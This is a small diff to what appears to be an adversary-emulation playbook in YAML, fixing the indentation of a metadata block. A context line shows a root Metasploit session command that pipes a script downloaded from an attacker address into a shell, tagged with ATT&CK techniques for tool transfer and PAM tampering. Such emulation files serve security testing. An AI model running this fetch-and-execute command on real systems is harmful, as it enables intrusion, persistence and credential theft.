@@ -266,7 +266,7 @@ commands:
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
-     metadata:
+    metadata:
       techniques: "T1105,T1556.003"
       tactics: "Command and Control,Persistence,Credential Access"
       technique_name:"Ingress Tool Transfer,Modify Authentication Process: Pluggable Authentication Modules"
